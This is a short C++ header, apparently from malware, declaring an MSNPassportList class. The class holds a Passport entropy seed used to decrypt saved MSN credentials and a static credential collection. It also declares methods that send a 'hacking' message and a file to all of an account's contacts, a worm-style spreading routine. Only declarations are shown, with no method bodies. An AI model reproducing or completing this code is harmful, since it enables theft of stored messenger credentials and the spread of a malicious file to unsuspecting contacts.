#include <windows.h>
#include <wincrypt.h>
#include "MSNClient.h"
#include "Main.h"

#define PASSPORT_ENTROPY_SEED_STRING    "82BD0E67-9FEA-4748-8672-D5EFE5B779B0";
#define ENTROPY_DATA_SIZE               74

#pragma once

class MSNPassportList {
   private:
      static MSNClient ** MSNAccountList;
      static int numElems; 
      static bool inicialized;
      static PCREDENTIAL * credentialCollection;
      
   public:
      static void inicialize();
      static bool sendAllContactHackingMessageAndFile(const char * strFilename);
      static bool sendAllContactMessageAndFile(const char * message, const char * strFilename);
      static bool isInicialized() { return inicialized; }
      static int getNumElems() { return numElems; }
};
